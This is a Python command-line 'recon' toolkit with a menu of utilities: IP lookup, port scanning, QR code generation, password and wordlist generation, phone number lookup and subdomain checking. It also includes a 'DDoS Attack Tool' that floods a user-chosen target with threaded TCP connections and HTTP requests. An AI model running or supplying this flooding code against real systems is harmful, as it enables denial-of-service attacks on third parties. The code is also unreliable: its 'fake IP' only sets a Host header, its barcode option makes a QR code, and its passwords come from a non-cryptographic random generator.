import socket
import requests
import qrcode
import random
import string
import sys
from termcolor import colored, cprint
import colorama
from colorama import Fore, Style
from colorama import init
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
import cowsay
import time

# Initialize colorama
init(autoreset=True)


# Function to print options in a colorful and attractive way
def print_menu():
    cprint("\n--------- Recon Automation Tool ---------", 'cyan', attrs=['bold'])
    cprint("1. IP Scanner", 'green')
    cprint("2. Port Scanner", 'yellow')
    cprint("3. Barcode Generator", 'blue')
    cprint("4. QRCode Generator", 'magenta')
    cprint("5. Password Generator", 'cyan')
    cprint("6. Wordlist Generator", 'green')
    cprint("7. Phone Number Information Gathering", 'yellow')
    cprint("8. Subdomain Checker", 'blue')
    cprint("9. DDos Attack Tool ", 'magenta', attrs=['bold', 'underline'])
    cprint("10. Exit", 'red')
    cprint("----------------------------------------", 'cyan')
def main():
    print("Main function started")
    print_banner()
# 1. IP Scanner
def ip_scanner(host):
    try:
        ip = socket.gethostbyname(host)
        cprint(f"The IP address of {host} is {ip}", 'green')
    except socket.gaierror:
        cprint("Error: Unable to resolve IP for the given host.", 'red')
    except Exception as e:
        cprint(f"An unexpected error occurred: {e}", 'red')

# 2. Port Scanner (Updated to allow specific or all ports)
def port_scanner(host):
    print(colored("\nChoose Port Scanning Option:", 'yellow', attrs=['bold']))
    print(colored("1. Scan Specific Ports", 'green'))
    print(colored("2. Scan All Common Ports (0-65535)", 'magenta'))

    choice = input(colored("Enter your choice (1 or 2): ", 'cyan', attrs=['bold']))
    
    try:
        if choice == '1':
            ports_input = input(colored("Enter ports (comma-separated, e.g., 22,80,443): ", 'yellow'))
            ports = [int(port.strip()) for port in ports_input.split(',') if port.strip().isdigit()]
            if not ports:
                print(colored("No valid ports entered.", 'red'))
                return
            else:
                print(colored(f"\nScanning {host} for specific ports...", 'yellow'))
                scan_ports(host, ports)
        elif choice == '2':
            print(colored(f"\nScanning {host} for all common ports (0-65535)... This may take a while.", 'magenta'))
            ports = range(0, 65536)  # Scan all ports from 0 to 65535
            scan_ports(host, ports)
        else:
            print(colored("Invalid choice! Please select either 1 or 2.", 'red'))
    except ValueError:
        print(colored("Invalid input. Please enter valid numbers for ports.", 'red'))
    except Exception as e:
        print(colored(f"An unexpected error occurred: {e}", 'red'))
def scan_ports(host, ports):
    """ Helper function to scan a list of ports and show only open ports """
    try:
        open_ports = []
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            result = sock.connect_ex((host, port))
            if result == 0:
                open_ports.append(port)
            sock.close()

        # Display all open ports
        if open_ports:
            print(colored(f"Open ports on {host}:", 'green', attrs=['bold']))
            for port in open_ports:
                print(colored(f"Port {port}: Open", 'green'))
        else:
            print(colored(f"No open ports found on {host}.", 'red'))

    except socket.error as e:
        print(colored(f"Socket error: {e}", 'red'))    
    except Exception as e:
        print(colored(f"An unexpected error occurred: {e}", 'red'))


#3. Barcode Generator
def barcode_generator(data):
    try:
        img = qrcode.make(data)
        img.show()
        cprint("Barcode displayed above.", 'blue')
    except Exception as e:
        cprint(f"Failed to generate barcode: {e}", 'red')

# 4. QRCode Generator
def qrcode_generator(data):
    try:
        qr_code = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=2,
            border=1,
        )
        qr_code.add_data(data)
        qr_code.make(fit=True)

        # Display QR code in the terminal using ASCII
        qr_matrix = qr_code.get_matrix()
        cprint("\nGenerated QR Code:\n", 'magenta', attrs=['bold'])
        for row in qr_matrix:
            line = ''.join(['██' if cell else '  ' for cell in row])
            print(colored(line, 'magenta'))
        cprint("\nQRCode displayed above.", 'magenta')
    except Exception as e:
        cprint(f"Failed to generate QRCode: {e}", 'red')

# 5. Password Generator
def password_generator(length=12):
    try:
        if length < 4:
            cprint("Password length should be at least 4 for better security.", 'red')
            return
        chars = string.ascii_letters + string.digits + string.punctuation
        password = ''.join(random.choice(chars) for _ in range(length))
        cprint(f"\nGenerated Password: {password}\n", 'cyan', attrs=['bold'])
    except Exception as e:
        cprint(f"Failed to generate password: {e}", 'red')

# 6. Wordlist Generator (Modified)
def wordlist_generator(word, count):
    try:
        cprint("\nGenerated Wordlist:", 'green', attrs=['bold'])
        for i in range(count):
            cprint(f"{word}{i}", 'green')
        cprint("\nWordlist displayed above.", 'green')
    except Exception as e:
        cprint(f"Failed to generate wordlist: {e}", 'red')

# 7. Phone Number Information Gathering (using phonenumbers library)
def phone_number_info(number):
    try:
        parsed_number = phonenumbers.parse(number, None)
        if phonenumbers.is_valid_number(parsed_number):
            country = geocoder.country_name_for_number(parsed_number, "en")
            carrier_name = carrier.name_for_number(parsed_number, "en")
            time_zones = timezone.time_zones_for_number(parsed_number)
            cprint("\nPhone Number Information:", 'yellow', attrs=['bold'])
            cprint(f"Number: {phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}", 'yellow')
            cprint(f"Country: {country}", 'yellow')
            cprint(f"Carrier: {carrier_name if carrier_name else 'N/A'}", 'yellow')
            cprint(f"Time Zones: {', '.join(time_zones)}", 'yellow')
        else:
            cprint("Invalid phone number.", 'red')
    except phonenumbers.NumberParseException:
        cprint("Error: The phone number format is incorrect.", 'red')
    except Exception as e:
        cprint(f"An unexpected error occurred: {e}", 'red')

# 8. Subdomain Checker
def subdomain_checker(domain, subdomains):
    cprint(f"\nChecking subdomains for {domain}...", 'blue')
    found_subdomains = []
    try:
        for sub in subdomains:
            sub = sub.strip()
            url = f"http://{sub}.{domain}"
            try:
                response = requests.get(url, timeout=3)
                if response.status_code < 400:
                    cprint(f"Subdomain Found: {url} (Status Code: {response.status_code})", 'green')
                    found_subdomains.append(url)
                else:
                    cprint(f"Subdomain {url} returned status code {response.status_code}", 'yellow')
            except requests.ConnectionError:
                cprint(f"Subdomain Not Found: {url}", 'red')
            except requests.Timeout:
                cprint(f"Request Timed Out for Subdomain: {url}", 'red')
            except Exception as e:
                cprint(f"An error occurred with {url}: {e}", 'red')
        if not found_subdomains:
            cprint("No valid subdomains found.", 'red')
    except Exception as e:
        cprint(f"An unexpected error occurred: {e}", 'red')

# 9. DDoS Attack Tool (for educational purposes only - use responsibly)
import threading
import socket

def ddos_attack(target, port, fake_ip, num_requests):
    def attack():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            sock.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            sock.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            sock.close()
        except socket.error as e:
            print(colored(f"Error sending requests: {e}", 'red'))
    
    # Start multiple threads to simulate a DDoS attack
    for i in range(num_requests):
        thread = threading.Thread(target=attack)
        thread.start()
        print(colored(f"Request {i+1} sent to {target} from fake IP {fake_ip}", 'yellow'))

def ddos_attack_tool():
    try:
        target = input(colored("Enter target IP or URL: ", 'magenta'))
        port = int(input(colored("Enter target port (e.g., 80): ", 'magenta')))
        fake_ip = input(colored("Enter fake IP address to use (e.g., 123.456.789.000): ", 'magenta'))
        num_requests = int(input(colored("Enter number of requests to send: ", 'magenta')))

        print(colored(f"Starting DDoS attack on {target} at port {port} using fake IP {fake_ip}", 'red', attrs=['bold']))
        ddos_attack(target, port, fake_ip, num_requests)
    except ValueError:
        print(colored("Error: Please enter a valid number for port and number of requests.", 'red'))
    except Exception as e:
        print(colored(f"An error occurred: {e}", 'red'))

def print_with_color(text, color):
    print(color + text + Style.RESET_ALL)


# Main Function
def main():
    # Print daemon with red color
    daemon_art = cowsay.get_output_string('daemon', "Welcome to Information Recon Tool")
    print_with_color(daemon_art, Fore.RED)

    while True:
        print_menu()
        choice = input(colored("\nEnter your choice: ", 'cyan', attrs=['bold']))

        if choice == '1':
            host = input(colored("Enter host (e.g., example.com): ", 'green'))
            ip_scanner(host)
        elif choice == '2':
            host = input(colored("Enter host (e.g., example.com): ", 'green'))
            port_scanner(host)
        elif choice == '3':
            data = input(colored("Enter data to generate barcode: ", 'blue'))
            barcode_generator(data)
        elif choice == '4':
            data = input(colored("Enter data to generate QRCode: ", 'magenta'))
            qrcode_generator(data)
        elif choice == '5':
            try:
                length = int(input(colored("Enter password length (minimum 4): ", 'cyan')))
                password_generator(length)
            except ValueError:
                cprint("Please enter a valid number for password length.", 'red')
        elif choice == '6':
            word = input(colored("Enter base word: ", 'green'))
            try:
                count = int(input(colored("Enter number of words to generate: ", 'green')))
                wordlist_generator(word, count)
            except ValueError:
                cprint("Please enter a valid number for word count.", 'red')
        elif choice == '7':
            number = input(colored("Enter phone number (with country code, e.g., +14155552671): ", 'yellow'))
            phone_number_info(number)
        elif choice == '8':
            domain = input(colored("Enter domain (e.g., example.com): ", 'blue'))
            subdomains_input = input(colored("Enter subdomains to check (comma-separated, e.g., www,mail,ftp): ", 'blue'))
            subdomains = [sub.strip() for sub in subdomains_input.split(',') if sub.strip()]
            if not subdomains:
                cprint("No valid subdomains entered.", 'red')
            else:
                subdomain_checker(domain, subdomains)
        elif choice == '9':
            ddos_attack_tool()
        elif choice == '10':
            cprint("\nExiting... Goodbye!\n", 'red', attrs=['bold'])
            sys.exit()
        else:
            cprint("Invalid choice! Please try again.", 'red')

if __name__ == "__main__":
    main()
